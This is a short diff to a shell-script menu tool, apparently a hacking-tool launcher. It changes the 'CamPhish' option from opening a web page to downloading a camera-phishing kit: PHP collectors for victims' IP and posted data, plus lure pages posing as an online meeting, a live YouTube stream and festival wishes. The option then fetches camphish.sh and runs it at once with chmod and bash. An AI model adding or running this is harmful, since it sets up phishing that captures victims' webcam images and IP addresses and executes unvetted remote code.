@@ -142,7 +142,12 @@ reset="\033[0m"
         5)
             type_animation "\nYou selected: CamPhish"
             type_animation "\nYou are being redirected to CamPhish posts... "
-            xdg-open "https://github.com/techchipnet/CamPhish?&max-results=7"
+            wget https://raw.githubusercontent.com/techchipnet/CamPhish/master/ip.php
+            wget https://raw.githubusercontent.com/techchipnet/CamPhish/master/post.php
+            wget https://raw.githubusercontent.com/techchipnet/CamPhish/master/OnlineMeeting.html
+            wget https://raw.githubusercontent.com/techchipnet/CamPhish/master/LiveYTTV.html
+            wget https://raw.githubusercontent.com/techchipnet/CamPhish/master/festivalwishes.html
+            wget https://raw.githubusercontent.com/techchipnet/CamPhish/master/camphish.sh && chmod +x camphish.sh && bash camphish.sh
             ;;
         6)
             type_animation "\nYou selected: Ubuntu Shell"
